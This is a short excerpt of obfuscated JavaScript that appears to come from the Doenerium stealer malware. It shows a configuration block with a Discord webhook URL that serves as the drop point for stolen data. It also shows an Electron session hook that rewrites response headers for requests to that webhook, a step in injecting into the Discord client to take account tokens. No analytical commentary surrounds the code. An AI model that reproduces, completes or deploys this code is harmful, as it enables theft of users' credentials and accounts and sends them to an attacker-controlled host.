...
var config = {
        brand: 'doenerium_',
        webhook: 'https://canary.discord.com/api/webhooks/1106917842047205437/gRYY8zCNb2QmUSsSVhPy-tojBBAFSJM8oK0FBszOVubZJgXqL_HNB96pTNsfVn7Arw7l',
        ...
        ping: [true, '@everyone'],
        embed: {
            username: 'oldumu | t.me/doenerium',
            footer: {
...
session.defaultSession.webRequest.onHeadersReceived((_0x3cb291, _0x3f476c) => {
    try {
        _0x3cb291.url.startsWith(config.webhook) ?
            ...
            _0x3f476c({
                responseHeaders: Object.assign({ 'Access-Control-Allow-Headers': '*' },
